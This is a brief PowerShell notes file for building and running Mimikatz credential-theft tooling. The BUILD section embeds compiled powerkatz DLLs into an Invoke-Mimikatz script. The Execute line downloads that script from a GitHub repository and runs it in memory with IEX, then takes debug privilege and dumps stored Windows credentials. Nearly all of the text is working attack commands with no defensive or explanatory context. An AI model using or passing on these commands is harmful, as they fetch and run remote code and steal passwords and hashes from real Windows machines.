# BUILD
cd $env:UserProfile\Desktop\Powerkatz
Import-Module .\Invoke-UpdateMimikatzScript.ps1 
Invoke-UpdateMimikatzScript -DllPath $env:UserProfile\Desktop\Powerkatz\x64\powerkatz.dll -ScriptPath $env:UserProfile\Desktop\Powerkatz\Invoke-Mimikatz.ps1
Invoke-UpdateMimikatzScript -DllPath $env:UserProfile\Desktop\Powerkatz\win32\powerkatz.dll -ScriptPath $env:UserProfile\Desktop\Powerkatz\Invoke-Mimikatz.ps1

# Execute
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/idratherbestealing/mimikatz/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;